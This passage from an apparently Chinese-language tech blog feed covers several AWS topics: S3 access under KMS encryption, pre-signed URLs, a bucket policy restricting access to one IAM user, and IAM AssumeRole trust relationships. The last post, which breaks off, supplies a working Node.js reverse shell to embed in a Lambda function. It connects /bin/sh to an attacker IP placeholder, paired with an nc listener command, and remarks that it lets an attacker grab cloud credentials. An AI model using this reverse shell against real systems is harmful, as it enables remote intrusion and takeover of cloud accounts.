经过KMS加密之后还能直接公开访问object吗？"></a>0x02 经过KMS加密之后还能直接公开访问object吗？</h2><p>众所周知，当我们给一个S3 Bucket设置KMS加密之后，当我们把对象公开之后，是没有办法直接通过URL去访问的。其背后的原理是因为当我们下载对象的时候需要向KMS服务端发起解密的请求，而直接通过浏览器URL访问，是没有带任何KMS相关的参数的，所以也就没有解密这种说法了。<br>我这边尽可能的多想一些场景测试看看，基本覆盖日常常见问题：</p><ol><li>不加密的S3 Bucket，当我们公开一个对象之后，是可以直接访问的（这个没什么说的，就是预期功能），为了保证实验的顺利进行，先关闭S3 Bucket的【阻止所有公共访问】功能，然后公开一个对象看看：</li></ol><p><img src="B25EEDB9C1A14E0AB9F65EA0893B44C7" alt="image"></p><p>可以看到浏览器中已经可以正常打开这个公开的对象了：</p><p><img src="1E42AFC4A623479191A38493F677A632" alt="image"></p><ol start="2"><li>那如果我上传的对象使用KMS加密了呢？其再次公开的时候会出现什么现象？</li></ol><p><img src="B960B0E0A2F0479D942601FDD6C4C929" alt="image"></p><p>可以看到，当我们在浏览器中直接访问是，其会报一个无效参数的错误。</p><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# curl https://aaabbbccc.s3.cn-north-1.amazonaws.com.cn/HappyFace.jpg</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;Error&gt;&lt;Code&gt;InvalidArgument&lt;/Code&gt;&lt;Message&gt;Requests specifying Server Side Encryption with AWS KMS managed keys require AWS Signature Version 4.&lt;/Message&gt;&lt;ArgumentName&gt;Authorization&lt;/ArgumentName&gt;&lt;ArgumentValue&gt;null&lt;/ArgumentValue&gt;&lt;RequestId&gt;1EE0A543A5ACF250&lt;/RequestId&gt;&lt;HostId&gt;vx4Jj96IbW6MGeo4+nNkCzJqtsjo7+7tnxoxr1M6SZG+otZMp3oB0Z1Qb9F+Yr9QzQc7BqsuYmY=&lt;/HostId&gt;&lt;/Error&gt;[root@ip-10-0-0-64 ~]#</span><br></pre></td></tr></table></figure></code></pre><p>看到这个报错是提示我没有使用signV4的签名，那我使用CLI去跨账号测试，看看会提示什么：</p><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# aws s3 cp s3://aaabbbccc/HappyFace.jpg HappyFace.jpg</span><br><span class="line">download failed: s3://aaabbbccc/HappyFace.jpg to ./HappyFace.jpg An error occurred (AccessDenied) when calling the GetObject operation: Access Denied</span><br><span class="line">[root@ip-10-0-0-64 ~]#</span><br></pre></td></tr></table></figure></code></pre><p>没有报参数无效，而是报了一个访问拒绝的：</p><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# aws s3 cp s3://aaabbbccc/HappyFace.jpg HappyFace.jpg</span><br><span class="line">download failed: s3://aaabbbccc/HappyFace.jpg to ./HappyFace.jpg An error occurred (AccessDenied) when calling the GetObject operation: Access Denied</span><br><span class="line">[root@ip-10-0-0-64 ~]#</span><br></pre></td></tr></table></figure></code></pre><p>这就比较有意思了，对象明明已经公开了，但是仍然提示访问拒绝，那估计我把KMS CMK的加解密权限也公开之后没准通过CLI随便指定个User之后，没准就能访问了呢。</p><ol start="3"><li>说干就干哈，KMS CMK加解密权限公开，S3 对象权限公开之后，会是啥状态呢？<br>当然，不用想了，浏览器中访问，签名走的是signV2所以肯定跟上面报一个错误的：</li></ol><p><img src="87F88A931DE341D0A10E7812D3AF3A0A" alt="image"></p><p>比较有意思的是，我在CLI中使用另一个用户下载该对象是成功的（KMS CMK的加解密权限已公开）：<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# aws s3 cp s3://aaabbbccc/HappyFace.jpg HappyFace.jpg</span><br><span class="line">download: s3://aaabbbccc/HappyFace.jpg to ./HappyFace.jpg</span><br><span class="line">[root@ip-10-0-0-64 ~]#</span><br></pre></td></tr></table></figure></p><p>按照这个思路，如果作为一个匿名用户，也通过signV4签名的方式访问，是不是也可以下载这个经过KMS加密的公开的对象了呢，比较尴尬的，似乎signV4就是要使用AKSK的，所以没法整，匿名用户都是走的signV2。<br>如果我使用–no-sign-request参数呢，可以看到也是不行的，因为你没有办法让–no-sign-request访问KMS的时候走signV4：<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# aws s3 cp s3://aaabbbccc/HappyFace.jpg HappyFace.jpg --no-sign-request</span><br><span class="line">download failed: s3://aaabbbccc/HappyFace.jpg to ./HappyFace.jpg An error occurred (InvalidArgument) when calling the GetObject operation: Requests specifying Server Side Encryption with AWS KMS managed keys require AWS Signature Version 4. You can enable AWS Signature Version 4 by running the command:</span><br><span class="line">aws configure set s3.signature_version s3v4</span><br><span class="line">[root@ip-10-0-0-64 ~]#</span><br></pre></td></tr></table></figure></p><p>至此，我再总结一下：</p><ol><li>如果使用了KMS加密，那无论KMS CMK的权限，当我把S3 object公开之后，通过浏览器或者wget都是不能访问的，会提示“无效参数”的错误。</li><li>如果使用了KMS加密，KMS的权限对外开放，那我如果使用CLI配置某一个用户之后是可以正常访问的</li><li>如果使用了KMS加密，KMS的权限对外开放，如果CLI使用–no-sign-request匿名执行命令也是不可以的</li></ol><h2 id="0x03-经过KMS加密之后还能通过pre-signed-URL的方式将object公开访问吗？"><a href="#0x03-经过KMS加密之后还能通过pre-signed-URL的方式将object公开访问吗？" class="headerlink" title="0x03 经过KMS加密之后还能通过pre-signed URL的方式将object公开访问吗？"></a>0x03 经过KMS加密之后还能通过pre-signed URL的方式将object公开访问吗？</h2><p>容我先把KMS CMK的权限改回去，然后关闭该对象的公开访问，然后在生成pre-signed URL试试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# aws s3 presign s3://aaabbbccc/HappyFace.jpg --profile root</span><br><span class="line">https://aaabbbccc.s3.cn-north-1.amazonaws.com.cn/HappyFace.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Expires=3600&amp;X-Amz-Credential=AKIAXUIR4JOPO4YK27P7%2F20191123%2Fcn-north-1%2Fs3%2Faws4_request&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Date=20191123T142742Z&amp;X-Amz-Signature=1bc979333e36b60d908f59811d9221303b1a44957821c5d35996300ede935cc6</span><br><span class="line">[root@ip-10-0-0-64 ~]#</span><br></pre></td></tr></table></figure></p><p>可以看到，是正常访问的：</p><p><img src="EB07150A82F443D4AE078C979CD09A0E" alt="image"></p><p>这件事其实还是比较好理解的，因为生成临时的签名，我也是用当前用户凭证去签的，当前用户有权限就行，所以生产的pre-signed URL是可以正常访问的（用KMS加密的对象也没事）。</p><h2 id="0x04-访问S3-pre-signed-URL报认证错误应该怎么处理？"><a href="#0x04-访问S3-pre-signed-URL报认证错误应该怎么处理？" class="headerlink" title="0x04 访问S3 pre-signed URL报认证错误应该怎么处理？"></a>0x04 访问S3 pre-signed URL报认证错误应该怎么处理？</h2><p>访问S3 pre-signed URL，报如下错误：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# aws s3 presign s3://aaabbb/webwxgeticon.jpg</span><br><span class="line">https://aaabbb.s3.cn-north-1.amazonaws.com.cn/webwxgeticon.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Expires=3600&amp;X-Amz-Credential=AKIAUKT6WCRV7BGA6LF3%2F20191123%2Fcn-north-1%2Fs3%2Faws4_request&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Date=20191123T143127Z&amp;X-Amz-Signature=38ec063e7940823b351e9a9798f82087929bcff1f2dab7a1ad49a705fb74a8b4</span><br><span class="line">[root@ip-10-0-0-64 ~]# curl &quot;https://aaabbb.s3.cn-north-1.amazonaws.com.cn/webwxgeticon.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Expires=3600&amp;X-Amz-Credential=AKIAUKT6WCRV7BGA6LF3%2F20191123%2Fcn-north-1%2Fs3%2Faws4_request&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Date=20191123T143127Z&amp;X-Amz-Signature=38ec063e7940823b351e9a9798f82087929bcff1f2dab7a1ad49a705fb74a8b4&quot;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;Error&gt;&lt;Code&gt;UnauthorizedAccess&lt;/Code&gt;&lt;Message&gt;You are not authorized to perform this operation&lt;/Message&gt;&lt;RequestId&gt;6116F30427B5AB43&lt;/RequestId&gt;&lt;HostId&gt;3wtTSiON9hssqGNCYfz+mCqigoFxl0s+DTJt3DKUEG9ABhGH5gOxCfOu7yJdKUHapN81r5uBUs0=&lt;/HostId&gt;&lt;/Error&gt;[root@ip-10-0-0-64 ~]#</span><br></pre></td></tr></table></figure></p><p>报这个错误的话，通常是由于当前账号未备案导致的（中国特色干啥都得备案），去找AWS备案就完事了。<br>当你公开对象的时候访问报这个错误，也是这个原因，挺那啥的这事。。。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>整理了一下S3 pre-signed URL与KMS加密的一些玩法，太不黑客了，不咋快乐。</p><h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h2><p>[1] presign, <a href="https://docs.aws.amazon.com/cli/latest/reference/s3/presign.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/cli/latest/reference/s3/presign.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;在这篇文章中，我会记录一下关于S3 pre-signed url和KMS加密交互的一些玩法。比如说：
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>S3 Bucket 如何配置才能做到只允许某一个IAM User操作？</title>
    <link href="https://tonghuaroot.com/2019/11/21/S3-Bucket-Policy-Only-One-User/"/>
    <id>https://tonghuaroot.com/2019/11/21/S3-Bucket-Policy-Only-One-User/</id>
    <published>2019-11-21T05:52:27.000Z</published>
    <updated>2019-11-21T13:52:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>有这么个需求，我有一个S3 Bucket，然后我只想让某一个User管理，我应该咋操作。<br>简而言之，可以通过Bucket Policy实现，限制某一个IAM User才能访问，然后其他的操作全都deny掉。</p><h2 id="0x01-Policy"><a href="#0x01-Policy" class="headerlink" title="0x01 Policy"></a>0x01 Policy</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">    &quot;Statement&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Effect&quot;: &quot;Deny&quot;,</span><br><span class="line">            &quot;Principal&quot;: &quot;*&quot;,</span><br><span class="line">            &quot;Action&quot;: &quot;s3:*&quot;,</span><br><span class="line">            &quot;Resource&quot;: [</span><br><span class="line">                &quot;arn:aws-cn:s3:::bucketname/*&quot;,</span><br><span class="line">                &quot;arn:aws-cn:s3:::bucketname&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Condition&quot;: &#123;</span><br><span class="line">                &quot;StringNotEquals&quot;: &#123;</span><br><span class="line">                    &quot;aws:username&quot;: &quot;username&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你要是用这个Policy的话，需要修改bucketname、username，别的没啥了。<br>Policy比较简单，大意就是有一个条件aws:username不等于我的username的，我就全都给deny掉。</p><p>这个是允许的user执行结果<br><img src="4D41A2B31F384E2DA5E5E5B8267E14AE" alt="image"></p><p>这个是其他无权限的user<br><img src="7BFCAA733F854E1A930ABC2E83283F1A" alt="image"></p><h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>可以在根据指定的action做一些精细化的访问控制，不过那就不在这个的讨论范围了。</p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p>没参考啥，去Policy的控制台测测就完了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;有这么个需求，我有一个S3 Bucket，然后我只想让某一个User管理，我应该咋操作。&lt;br&gt;简而
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>聊一聊AssumeRole和Trust Relationship</title>
    <link href="https://tonghuaroot.com/2019/11/21/IAM-AssumeRole-and-TrustRelationship/"/>
    <id>https://tonghuaroot.com/2019/11/21/IAM-AssumeRole-and-TrustRelationship/</id>
    <published>2019-11-21T01:26:38.000Z</published>
    <updated>2019-11-21T13:00:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>AWS在IAM服务提供了一个Role的功能，Role的话就是可以扩大自己的权限，比如说一个user可以临时assume一个role，那这个user就具备这个role的权限了。或者跨账号访问的时候也可以用这个role。再比如说我做SSO的时候，也是用role实现的。</p><p>那和role相关的最小action都有哪些呢？这一节我们就来聊一聊这块。</p><h2 id="0x01-IAM-Role-权限的组成部分"><a href="#0x01-IAM-Role-权限的组成部分" class="headerlink" title="0x01 IAM Role 权限的组成部分"></a>0x01 IAM Role 权限的组成部分</h2><p>我这里创建两个role（一个role A，一个role B），role A是为了让EC2实例附加，role B是为了让role A assume。</p><p>Role B的Policy具有管理员权限（当然我们这节也不用关系它），重点看看role B的信任关系，和role A的Policy。</p><p>IAM Role 的权限通常由两部分组成，一个是Policy，一个是Trust Relationship（信任关系）。Policy就是我这个role能干多大的事。信任关系就是说，谁能assume这个role，这里的“谁”，可能是指user、role等等。其实我现在jio着这个信任关系，倒是跟S3 Bucket Policy还是有几分相像的。</p><p>那就先看看这个role还有信任关系啥的吧：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 tmp]# aws iam get-role --role-name assumerole_role_target</span><br><span class="line">&#123;</span><br><span class="line">    &quot;Role&quot;: &#123;</span><br><span class="line">        &quot;Description&quot;: &quot;Allows EC2 instances to call AWS services on your behalf.&quot;,</span><br><span class="line">        &quot;AssumeRolePolicyDocument&quot;: &#123;</span><br><span class="line">            &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">            &quot;Statement&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;Action&quot;: &quot;sts:AssumeRole&quot;,</span><br><span class="line">                    &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">                    &quot;Principal&quot;: &#123;</span><br><span class="line">                        &quot;AWS&quot;: &quot;arn:aws-cn:iam::123456789012:role/assume_role_ec2&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;MaxSessionDuration&quot;: 3600,</span><br><span class="line">        &quot;RoleId&quot;: &quot;AROAUKT6WCRVQNHNPAHIN&quot;,</span><br><span class="line">        &quot;CreateDate&quot;: &quot;2019-11-21T03:46:08Z&quot;,</span><br><span class="line">        &quot;Tags&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;Value&quot;: &quot;test&quot;,</span><br><span class="line">                &quot;Key&quot;: &quot;Name&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;RoleName&quot;: &quot;assumerole_role_target&quot;,</span><br><span class="line">        &quot;Path&quot;: &quot;/&quot;,</span><br><span class="line">        &quot;Arn&quot;: &quot;arn:aws-cn:iam::123456789012:role/assumerole_role_target&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 tmp]#</span><br></pre></td></tr></table></figure></p><p>再来看看role A的Policy：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 tmp]# aws iam list-role-policies --role-name assume_role_ec2</span><br><span class="line">&#123;</span><br><span class="line">    &quot;PolicyNames&quot;: []</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 tmp]#</span><br></pre></td></tr></table></figure></p><p>为空时因为我们没有内联策略，然后我现在给他附加了一个托管策略（admin_test），不过策略的内容是空的。</p><p><img src="C23DC59AE3E44289B02B5388D53A17D6" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 tmp]# aws iam get-policy --policy-arn arn:aws-cn:iam::123456789012:policy/admin_test</span><br><span class="line">&#123;</span><br><span class="line">    &quot;Policy&quot;: &#123;</span><br><span class="line">        &quot;PolicyName&quot;: &quot;admin_test&quot;,</span><br><span class="line">        &quot;PermissionsBoundaryUsageCount&quot;: 0,</span><br><span class="line">        &quot;CreateDate&quot;: &quot;2019-11-21T04:06:32Z&quot;,</span><br><span class="line">        &quot;AttachmentCount&quot;: 1,</span><br><span class="line">        &quot;IsAttachable&quot;: true,</span><br><span class="line">        &quot;PolicyId&quot;: &quot;ANPAUKT6WCRV5UNNV3DZA&quot;,</span><br><span class="line">        &quot;DefaultVersionId&quot;: &quot;v3&quot;,</span><br><span class="line">        &quot;Path&quot;: &quot;/&quot;,</span><br><span class="line">        &quot;Arn&quot;: &quot;arn:aws-cn:iam::123456789012:policy/admin_test&quot;,</span><br><span class="line">        &quot;UpdateDate&quot;: &quot;2019-11-21T04:35:13Z&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 tmp]#</span><br></pre></td></tr></table></figure><p>可以看到我现在这个role现在附加的Policy只有个ec2:DescribeInstances权限，对IAM相关的权限肯定没啥影响。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 tmp]# aws iam get-policy-version --policy-arn arn:aws-cn:iam::123456789012:policy/admin_test  --version-id v4</span><br><span class="line">&#123;</span><br><span class="line">    &quot;PolicyVersion&quot;: &#123;</span><br><span class="line">        &quot;CreateDate&quot;: &quot;2019-11-21T08:45:11Z&quot;,</span><br><span class="line">        &quot;VersionId&quot;: &quot;v4&quot;,</span><br><span class="line">        &quot;Document&quot;: &#123;</span><br><span class="line">            &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">            &quot;Statement&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;Action&quot;: &quot;ec2:DescribeInstances&quot;,</span><br><span class="line">                    &quot;Resource&quot;: &quot;*&quot;,</span><br><span class="line">                    &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">                    &quot;Sid&quot;: &quot;VisualEditor0&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;IsDefaultVersion&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 tmp]#</span><br></pre></td></tr></table></figure></p><h2 id="0x02-测试看看"><a href="#0x02-测试看看" class="headerlink" title="0x02 测试看看"></a>0x02 测试看看</h2><p>然后我现在做一个assume操作试试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 tmp]# aws sts assume-role --role-arn arn:aws-cn:iam::123456789012:role/assumerole_role_target --role-session-name xxx</span><br><span class="line">&#123;</span><br><span class="line">    &quot;AssumedRoleUser&quot;: &#123;</span><br><span class="line">        &quot;AssumedRoleId&quot;: &quot;AROAUKT6WCRVQNHNPAHIN:xxx&quot;,</span><br><span class="line">        &quot;Arn&quot;: &quot;arn:aws-cn:sts::123456789012:assumed-role/assumerole_role_target/xxx&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;Credentials&quot;: &#123;</span><br><span class="line">        &quot;SecretAccessKey&quot;: &quot;xx&quot;,</span><br><span class="line">        &quot;SessionToken&quot;: &quot;xx&quot;,</span><br><span class="line">        &quot;Expiration&quot;: &quot;2019-11-21T09:49:55Z&quot;,</span><br><span class="line">        &quot;AccessKeyId&quot;: &quot;xx&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 tmp]# date</span><br><span class="line">Thu Nov 21 08:50:35 UTC 2019</span><br><span class="line">[root@ip-10-0-0-64 tmp]#</span><br></pre></td></tr></table></figure></p><p>可以看到已经成了。</p><p>那我再来修改一下role B的信任关系，修改成当前账号的root arn试试。</p><p><img src="C8FA85D9759946C0B7A19E705254ECCB" alt="image"></p><p>然后在执行assume role操作，可以看到这个操作被拒绝了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 tmp]# aws sts assume-role --role-arn arn:aws-cn:iam::123456789012:role/assumerole_role_target --role-session-name xxx</span><br><span class="line"></span><br><span class="line">An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws-cn:sts::123456789012:assumed-role/assume_role_ec2/i-111ecda157b494afe is not authorized to perform: sts:AssumeRole on resource: arn:aws-cn:iam::123456789012:role/assumerole_role_target</span><br><span class="line">[root@ip-10-0-0-64 tmp]#</span><br></pre></td></tr></table></figure></p><p>那这是因为啥呢，起初我刚看到这个现象的时候一脸懵逼啊，心想我root账号都有权限了，凭啥role就没权限搞呢？</p><p>后来想想对标一下S3 Bucket Policy这个事就明了了，我只是把权限给root了，但是作为root账号我还要把权限委派下去啊，我需要给role A一个sts:AssumeRole的权限。</p><p><img src="9615AC89FD9C4A09B115202C8CD12751" alt="image"></p><p>再来试试：</p><p><img src="1F90A49B947A45AEB7CCC47AA19770E3" alt="image"></p><p>可以看到已经成功了哈。</p><h2 id="0x03-跨账号能这么玩吗？"><a href="#0x03-跨账号能这么玩吗？" class="headerlink" title="0x03 跨账号能这么玩吗？"></a>0x03 跨账号能这么玩吗？</h2><p><img src="8A360C98FDAA4B7C9E02F5E4A490BFF1" alt="image"></p><p>嗯，试了一下，跨账号这么晚也没啥毛病。</p><p>当然比较常见的使用方法，除了使用cli，在控制台中也可以这么操作：</p><p><img src="A93793ABD19D4B16AF13AC377B4C7A22" alt="image"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ul><li>同一账号下，role B的信任关系中有role A的ARN就够了</li><li>跨账号的场景下，role C（另一个账号的role，信任关系中要包含role A的ARN，role A也要有assume role的权限才能玩）</li></ul><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul><li><a href="https://docs.aws.amazon.com/cli/latest/reference/iam/list-role-policies.html" target="_blank" rel="noopener">list-role-policies</a></li><li><a href="https://docs.aws.amazon.com/cli/latest/reference/iam/get-role.html" target="_blank" rel="noopener">get-role</a></li><li><a href="https://docs.aws.amazon.com/cli/latest/reference/iam/get-role-policy.html" target="_blank" rel="noopener">get-role-policy</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;AWS在IAM服务提供了一个Role的功能，Role的话就是可以扩大自己的权限，比如说一个user可
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>AWS Lambda Node.js 反弹shell</title>
    <link href="https://tonghuaroot.com/2019/11/19/AWS-Lambda-Node-js-reverse-shell/"/>
    <id>https://tonghuaroot.com/2019/11/19/AWS-Lambda-Node-js-reverse-shell/</id>
    <published>2019-11-19T05:29:28.000Z</published>
    <updated>2019-11-19T13:30:08.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>原本在测AWS Lambda，后来变成研究Node.js反弹shell了，hhh。</p><h2 id="0x01-被攻击端"><a href="#0x01-被攻击端" class="headerlink" title="0x01 被攻击端"></a>0x01 被攻击端</h2><p>直接套到lambda函数里就行了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">    var net = require(&quot;net&quot;),</span><br><span class="line">    cp = require(&quot;child_process&quot;),</span><br><span class="line">    sh = cp.spawn(&quot;/bin/sh&quot;, []);</span><br><span class="line">    var client = new net.Socket();</span><br><span class="line">    client.connect(8080, &quot;此处替换为攻击端IP&quot;, function()&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    return /a/;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p><h2 id="0x02-攻击端"><a href="#0x02-攻击端" class="headerlink" title="0x02 攻击端"></a>0x02 攻击端</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8820</span><br></pre></td></tr></table></figure><p><img src="30A77ADC0C20496B90A0EC64DA37CE0D" alt="image"></p><h2 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h2><p>这就就是云服务接管比直接的服务器被控的危害更大，就是可以在环境变量或者元数据中拿AKSK，然后权限配置不当的话，可以直接控了整个云账号了。</p><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 